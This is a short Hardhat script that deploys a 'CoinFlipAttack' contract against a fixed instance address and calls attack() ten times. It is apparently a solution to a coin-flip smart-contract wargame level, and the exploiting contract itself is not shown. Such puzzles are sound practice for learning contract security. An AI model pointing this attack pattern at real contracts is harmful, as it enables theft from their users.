const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0xDd1EFe67a4F246ec79B0b18Df039425eCd254Ea0";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("CoinFlipAttack");
  const contract = await Contract.deploy(instanceAddress);

  // Attack

  let tx;
  for (let i = 0; i < 10; i++) {
    tx = await contract.attack();
    await tx.wait();
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
